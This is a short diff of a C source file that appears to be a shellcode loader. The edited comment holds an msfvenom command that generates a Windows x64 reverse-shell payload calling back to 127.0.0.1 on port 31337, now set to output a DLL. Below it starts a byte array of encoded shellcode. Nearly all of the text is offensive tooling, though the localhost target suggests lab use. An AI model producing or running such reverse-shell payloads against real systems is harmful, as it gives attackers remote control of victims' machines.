@@ -11,7 +11,7 @@
 int main(int argc, char *argv[]) {
 
     // Reverse shell to 127.0.0.1:31337
-    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f c -b \x00\x0a\x0d
+    // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
     unsigned char shellcode[] =
         "\xCC"
         "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
